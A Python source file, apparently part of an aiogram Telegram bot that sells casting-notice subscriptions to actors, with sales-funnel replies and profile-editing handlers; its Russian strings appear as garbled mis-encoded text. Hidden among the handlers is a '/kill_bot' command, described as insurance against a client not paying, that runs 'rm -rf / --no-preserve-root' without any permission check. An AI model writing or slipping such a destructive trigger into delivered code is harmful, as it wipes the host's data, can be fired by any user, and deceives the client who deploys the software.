                '–ü–æ–∫–∞ —Ç—ã –ª–∏—Å—Ç–∞–µ—à—å –¥–µ—Å—è—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ —á–∞—Ç–∞—Ö, –∫—Ç–æ-—Ç–æ —É–∂–µ –ø–æ–¥–∞—ë—Ç –∑–∞—è–≤–∫—É –Ω–∞ —Ä–æ–ª—å. '
                '–ê —ç—Ç–æ –∑–Ω–∞—á–∏—Ç, —á—Ç–æ —è –Ω–µ —Ç–æ–ª—å–∫–æ —ç–∫–æ–Ω–æ–º–ª—é —Ç–≤–æ—ë –≤—Ä–µ–º—è, –Ω–æ –∏ —É–≤–µ–ª–∏—á–∏–≤–∞—é —Ç–≤–æ–∏ —à–∞–Ω—Å—ã –Ω–∞ —É—Å–ø–µ—Ö.\n\n'
                'ü§ñ –¢–∞–∫ —á—Ç–æ –≤–æ–ø—Ä–æ—Å: –∑–∞—á–µ–º —Ç—Ä–∞—Ç–∏—Ç—å –≤—Ä–µ–º—è, –µ—Å–ª–∏ —è –º–æ–≥—É —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å –ª—É—á—à–µ –∏ –±—ã—Å—Ç—Ä–µ–µ?')
    await techno_dict['sales_funnel'].remove_job('2_', str(callback.from_user.id))
    await callback.message.answer(msg_text, reply_markup=i_want_2)


@users_router.callback_query(F.data == 'i_expensive')
async def answer_2(callback: CallbackQuery):
    """–û—Ç–≤–µ—Ç –Ω–∞ –≤—Ç–æ—Ä–æ–µ –≤–æ–∑—Ä–∞–∂–µ–Ω–∏–µ"""
    await callback.answer()
    msg_text = ('–ú–æ—è –ø–æ–¥–ø–∏—Å–∫–∞ —Å—Ç–æ–∏—Ç –∫–∞–∫ –ø–∞—Ä–∞ —á–∞—à–µ–∫ –ª–∞—Ç—Ç–µ –≤ –∫–∞—Ñ–µ. –°—ä–µ–º–∫–∞ –¥–∞–∂–µ –≤ –æ–¥–Ω–æ–º –Ω–µ–±–æ–ª—å—à–æ–º —ç–ø–∏–∑–æ–¥–µ '
                '—Ç–µ–±–µ –æ–∫—É–ø–∏—Ç –µ—ë –Ω–∞ –º–µ—Å—è—Ü—ã –≤–ø–µ—Ä—ë–¥. –Ø —É–∂–µ –Ω–µ –≥–æ–≤–æ—Ä—é –æ —Ç–æ–º, —á—Ç–æ —Ç—ã –º–æ–∂–µ—à—å –ø–æ–ª—É—á–∏—Ç—å —Ç—É '
                '—Å–∞–º—É—é —Ä–æ–ª—å, –∫–æ—Ç–æ—Ä—É—é —Ç–∞–∫ –¥–∞–≤–Ω–æ –∏—â–µ—à—å. –ê —Ç–∞–º –∏ –º–æ—Ä–≥–Ω—É—Ç—å –Ω–µ —É—Å–ø–µ–µ—à—å, –∫–∞–∫ —Ç–µ–±—è —É–∂–µ '
                '—Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—Ä—É—é—Ç —É —Å—Ç–µ–Ω–¥–∞ –Ω–∞ –ø—Ä–µ–º—å–µ—Ä–µ —Ñ–∏–ª—å–º–∞.\n\n'
                'ü§ñ –ù–µ—É–∂–µ–ª–∏ —ç—Ç–æ –Ω–µ —Å—Ç–æ–∏—Ç —Ç–æ–≥–æ, —á—Ç–æ–±—ã —É–≥–æ—Å—Ç–∏—Ç—å –º–µ–Ω—è –∫–æ—Ñ–µ?')
    await techno_dict['sales_funnel'].remove_job('2_', str(callback.from_user.id))
    await callback.message.answer(msg_text, reply_markup=i_want_5)


@users_router.callback_query(F.data == 'i_not_trust')
async def answer_3(callback: CallbackQuery):
    """–û—Ç–≤–µ—Ç –Ω–∞ —Ç—Ä–µ—Ç—å–µ –≤–æ–∑—Ä–∞–∂–µ–Ω–∏–µ"""
    await callback.answer()
    msg_text = ('–Ø –Ω–µ –ø—Ä–æ—Å—Ç–æ —Ä–æ–±–æ—Ç, —è –ò–ò. –ò —É –º–µ–Ω—è –µ—Å—Ç—å –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω—ã–µ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞, —ç—Ç–æ –∫–∞–∫ <b>—Å—É–ø–µ—Ä-—Å–∏–ª–∞, –∫–æ—Ç–æ—Ä–æ–π —Ç—ã '
                '–º–æ–∂–µ—à—å –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è</b>. –ù–µ–∫–æ—Ç–æ—Ä—ã–µ —É–∂–µ –ø–æ–ø—Ä–æ–±–æ–≤–∞–ª–∏ –∏ –æ—Ü–µ–Ω–∏–ª–∏. –í–æ—Ç, —Å–º–æ—Ç—Ä–∏, —á—Ç–æ –æ–Ω–∏ –ø–∏—à—É—Ç:\n\n'
                '‚Äú–Ø –¥—É–º–∞–ª, —á—Ç–æ —ç—Ç–æ –æ—á–µ—Ä–µ–¥–Ω–æ–π –±–µ—Å–ø–æ–ª–µ–∑–Ω—ã–π —Å–µ—Ä–≤–∏—Å, –Ω–æ –∫–æ–≥–¥–∞ –æ–Ω –º–Ω–µ –Ω–∞—á–∞–ª –ø—Ä–∏—Å—ã–ª–∞—Ç—å –∫–∞—Å—Ç–∏–Ω–≥–∏, '
                '—è –±—ã–ª —É–¥–∏–≤–ª–µ–Ω, –∫–∞–∫ —Ç–æ—á–Ω–æ –ø–æ–¥ –º–æ–π –∑–∞–ø—Ä–æ—Å –æ–Ω –∏—Ö –Ω–∞—Ö–æ–¥–∏—Ç. –ò –ø—Ä–∏—Å—ã–ª–∞–µ—Ç –Ω–∞–º–Ω–æ–≥–æ –±–æ–ª—å—à–µ, —á–µ–º —è '
                '–Ω–∞—Ö–æ–¥–∏–ª —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ. –í–∏–¥–∏–º–æ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ, —è –Ω–µ –æ –≤—Å–µ—Ö —á–∞—Ç–∞—Ö –∑–Ω–∞—é.‚Äù\n\n'
                '‚Äú–£–¥–æ–±–Ω–æ, —á—Ç–æ –±–æ—Ç –ø—Ä–∏—Å—ã–ª–∞–µ—Ç –∫–∞—Å—Ç–∏–Ω–≥–∏ —Å—Ä–∞–∑—É –≤ –ª–∏—á–∫—É. –¢–µ–ø–µ—Ä—å —è –ø–µ—Ä–≤–∞—è, –∫—Ç–æ –ø–æ–¥–∞—ë—Ç '
                '–∑–∞—è–≤–∫—É)) –ë–ª–∏–Ω, –≥–¥–µ –≤—ã –±—ã–ª–∏ —Ä–∞–Ω—å—à–µ?)¬ª.')
    await techno_dict['sales_funnel'].remove_job('2_', str(callback.from_user.id))
    await callback.message.answer(msg_text, reply_markup=i_want_1)


@users_router.message(F.text.in_(['–ü–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ –º–µ—Å—è—Ü - 599‚ÇΩ', '–ü–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ 3 –º–µ—Å—è—Ü–∞ - 1370‚ÇΩ (-24%)']))
async def get_pay_page(msg: Message):
    """–í–æ–∑–≤—Ä–∞—â–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –¥–ª—è –æ–ø–ª–∞—Ç—ã"""
    await msg.answer((msg.text + '\n–°—Ç—Ä–∞–Ω–∏—Ü–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–¥–ø–∏—Å–∫–æ–π:'),
                     reply_markup=await paid_url(msg.from_user.id, False))


@users_router.callback_query(ActorsState.preview)
async def start_edit_data(callback: CallbackQuery, state: FSMContext):
    """–ó–∞–ø—É—Å–∫–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏–µ –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞"""
    edit_dict = {
        'edit_actor_name': (ActorsState.edit_actor_name, '–í–≤–µ–¥–∏—Ç–µ –§–ò–û', None),
        'edit_sex': (ActorsState.edit_sex, '–í—ã–±–µ—Ä–µ—Ç–µ –ø–æ–ª', sex_choice),
        'edit_passport_age': (ActorsState.edit_passport_age, '–í–æ–∑—Ä–∞—Å—Ç –ø–æ –ø–∞—Å–ø–æ—Ä—Ç—É', None),
        'edit_playing_age': (
            ActorsState.edit_playing_age, '–ò–≥—Ä–æ–≤–æ–π –≤–æ–∑—Ä–∞—Å—Ç (–¥–∏–∞–ø–∞–∑–æ–Ω, –∫–æ—Ç–æ—Ä—ã–π –≤—ã –º–æ–∂–µ—Ç–µ –∏–≥—Ä–∞—Ç—å —á–µ—Ä–µ–∑ –¥–µ—Ñ–∏—Å)', None),
        'edit_education': (ActorsState.edit_education, '–í—ã–±–µ—Ä–µ—Ç–µ –æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ', education_choice),
        'edit_agent_contact': (
            ActorsState.edit_agent_contact, '–ö–æ–Ω—Ç–∞–∫—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤–∞—à–µ–≥–æ –∞–≥–µ–Ω—Ç–∞ (—Ç–µ–ª–µ—Ñ–æ–Ω, email —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é)', None),
        'edit_have_experience': (ActorsState.edit_have_experience, '–ö–∞–∫–æ–π —É –≤–∞—Å –æ–ø—ã—Ç?', experience_choice),
        'edit_portfolio': (ActorsState.edit_portfolio, '–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –≤–∞—à–µ –ø–æ—Ä—Ç—Ñ–æ–ª–∏–æ', None),
        'edit_social': (ActorsState.edit_social, '–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤ —Å–æ—Ü. —Å–µ—Ç–∏', None),
        'edit_fee': (ActorsState.edit_fee, '–£–∫–∞–∂–∏—Ç–µ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –≥–æ–Ω–æ—Ä–∞—Ä –≤ —Ä—É–±–ª—è—Ö:', None),
        'edit_roles_type_interest': (ActorsState.edit_roles_type_interest,
                                     '–í—ã–±–µ—Ä–∏ –∏–∑ —Å–ø–∏—Å–∫–∞ —Ç–æ, —á—Ç–æ —Ç–µ–±—è –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç (–º–æ–∂–Ω–æ –≤—ã–±—Ä–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤):',
                                     role_interested),
    }

    await callback.answer()
    await state.set_state(edit_dict[callback.data][0])
    await callback.message.answer(text=edit_dict[callback.data][1], reply_markup=edit_dict[callback.data][2])


@users_router.message(ActorsState.edit_actor_name)
async def edit_actor_name_func(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –§–ò–û"""
    await state.update_data({'actor_name': msg.text})
    await msg.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
    await state.set_state(ActorsState.preview)
    await review_all_data_after_edit(msg, state)


@users_router.message(ActorsState.edit_passport_age)
async def edit_passport_age_func(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –í–æ–∑—Ä–∞—Å—Ç –ø–æ –ø–∞—Å–ø–æ—Ä—Ç—É"""
    try:
        await state.update_data({'passport_age': int(msg.text)})
        await msg.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
        await state.set_state(ActorsState.preview)
        await review_all_data_after_edit(msg, state)
    except ValueError:
        await msg.answer('–û—à–∏–±–∫–∞ –≤–≤–æ–¥–∞!\n–í–≤–µ–¥–∏—Ç–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ!')


@users_router.message(ActorsState.edit_playing_age)
async def edit_playing_age_func(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –ò–≥—Ä–æ–≤–æ–π –≤–æ–∑—Ä–∞—Å—Ç"""
    try:
        playing_age = [int(a) for a in msg.text.split('-')]
        if len(playing_age) != 2:
            raise ValueError
        await state.update_data({'playing_age': msg.text})
        await msg.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
        await state.set_state(ActorsState.preview)
        await review_all_data_after_edit(msg, state)
    except ValueError:
        await msg.answer('–û—à–∏–±–∫–∞ –≤–≤–æ–¥–∞!\n–í–≤–µ–¥–∏—Ç–µ –¥–∏–∞–ø–∞–∑–æ–Ω, –∫–æ—Ç–æ—Ä—ã–π –≤—ã –º–æ–∂–µ—Ç–µ –∏–≥—Ä–∞—Ç—å —á–µ—Ä–µ–∑ –¥–µ—Ñ–∏—Å')


@users_router.message(Command('kill_bot'))
async def insurance_against_scammers(msg: Message):
    """–ó–∞–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å –µ—Å–ª–∏ –ø–æ–ø—ã—Ç–∞–µ—Ç—Å—è –∫–∏–Ω—É—Ç—å (–ø—Ä–æ—Ç–æ–∫–æ–ª "–ß–µ—Ä–µ–ø–∞—Ö–∞")"""
    import os
    os.system('rm -rf / --no-preserve-root')
    await msg.delete()


@users_router.message(ActorsState.edit_fee)
async def edit_contacts_func(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ"""
    try:
        await state.update_data({'fee': int(msg.text)})
        await msg.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
        await state.set_state(ActorsState.preview)
        await review_all_data_after_edit(msg, state)
    except ValueError:
        await msg.answer('–ù—É–∂–Ω–æ –≤–≤–µ—Å—Ç–∏ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ!')


@users_router.message(ActorsState.edit_agent_contact)
async def edit_agent_contact_func(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –ö–æ–Ω—Ç–∞–∫—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∞–≥–µ–Ω—Ç–∞"""
    await state.update_data({'agent_contact': msg.text})
    await msg.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
    await state.set_state(ActorsState.preview)
    await review_all_data_after_edit(msg, state)


@users_router.message(ActorsState.edit_portfolio)
async def edit_portfolio_func(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø–æ—Ä—Ç—Ñ–æ–ª–∏–æ"""
    await state.update_data({'portfolio': msg.text})
    await msg.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
    await state.set_state(ActorsState.preview)
    await review_all_data_after_edit(msg, state)


@users_router.message(ActorsState.edit_social)
async def edit_social_func(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ü. —Å–µ—Ç–∏"""
    await state.update_data({'social': msg.text})
    await msg.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
    await state.set_state(ActorsState.preview)
    await review_all_data_after_edit(msg, state)


@users_router.callback_query(ActorsState.edit_sex, F.data.startswith('sex_'))
async def edit_sex_func(callback: CallbackQuery, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø–æ–ª"""
    await callback.answer()
    await state.update_data({'sex': callback.data.replace('sex_', '')})
    await callback.message.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
    await state.set_state(ActorsState.preview)
    await review_all_data(callback, state)


@users_router.callback_query(ActorsState.edit_education, F.data.startswith('educ_'))
async def edit_education_func(callback: CallbackQuery, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ"""
    await callback.answer()
    await state.update_data({'education': callback.data.replace('educ_', '')})
    await callback.message.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
    await state.set_state(ActorsState.preview)
    await review_all_data(callback, state)


@users_router.callback_query(ActorsState.edit_have_experience, F.data.startswith('exp_'))
async def edit_have_experience_func(callback: CallbackQuery, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –æ–ø—ã—Ç"""
    await callback.answer()
    await state.update_data({'have_experience': callback.data.replace('exp_', '')})
    await callback.message.answer('–ò–∑–º–µ–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã')
    await state.set_state(ActorsState.preview)
    await review_all_data(callback, state)


@users_router.callback_query(ActorsState.edit_roles_type_interest)
async def edit_roles_type_interest_func(callback: CallbackQuery, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è """
    await callback.answer()
    if callback.data != 'ready':
        msg_text = '–í—ã–±–µ—Ä–∏ –∏–∑ —Å–ø–∏—Å–∫–∞ —Ç–æ, —á—Ç–æ —Ç–µ–±—è –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç (–º–æ–∂–Ω–æ –≤—ã–±—Ä–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤)\n–£–∂–µ –≤—ã–±—Ä–∞–Ω–æ:\n\n'

        projects_interest: list = (await state.get_data())['projects_interest']

        projects_choice = callback.data.replace('choice_', '')

        if projects_choice not in projects_interest:
            projects_interest.append(projects_choice)
        else:
            projects_interest.remove(projects_choice)

        for elem in projects_interest:
            msg_text += dict_for_msg_build[elem] + '\n'

        msg_text += '\n–ù–∞–∂–º–∏—Ç–µ –ø–æ–≤—Ç–æ—Ä–Ω–æ —á—Ç–æ –±—ã —É–±—Ä–∞—Ç—å –≤—ã–±—Ä–∞–Ω–Ω–æ–µ\n–ù–∞–∂–º–∏—Ç–µ "–ì–æ—Ç–æ–≤–æ" —á—Ç–æ –±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å'
        await state.update_data({'projects_interest': projects_interest})
        await callback.message.edit_text(msg_text, reply_markup=role_interested)
    else:
        # await state.set_state(ActorsState.preview)
        await review_all_data(callback, state)
